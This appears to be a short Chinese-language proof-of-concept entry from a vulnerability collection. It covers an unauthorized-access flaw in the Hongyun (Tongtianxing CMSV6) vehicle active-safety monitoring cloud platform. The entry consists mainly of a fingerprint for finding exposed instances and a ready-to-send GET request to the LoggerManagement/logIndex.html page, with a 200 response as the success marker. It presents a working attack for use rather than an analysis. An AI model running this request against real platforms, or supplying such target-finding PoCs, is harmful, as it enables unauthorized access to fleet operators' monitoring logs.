﻿# 鸿运(通天星CMSV6车载)主动安全监控云平台LoggerManagement logIndex.html 未授权访问漏洞

> 更新时间：2024-04-13

> 漏洞编号：

> 漏洞说明：鸿运主动安全监控云平台实现对计算资源、存储资源、网络资源、云应用服务进行7*24小时全时区、多地域、全方位、立体式、智能化的IT运维监控，保障IT系统安全、稳定、可靠运行。鸿运(通天星CMSV6车载)主动安全监控云平台LoggerManagement/logIndex.html存在未授权访问漏洞。

> 漏洞特征：body="./open/webApi.html"||body="/808gps/"

> 验证脚本：HTTP

```
GET /808gps/LoggerManagement/logIndex.html HTTP/1.1
Accept: */*
Connection: Keep-Alive
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：鸿运(通天星CMSV6车载)主动安全监控云平台LoggerManagement logIndex.html 未授权访问漏洞.poc

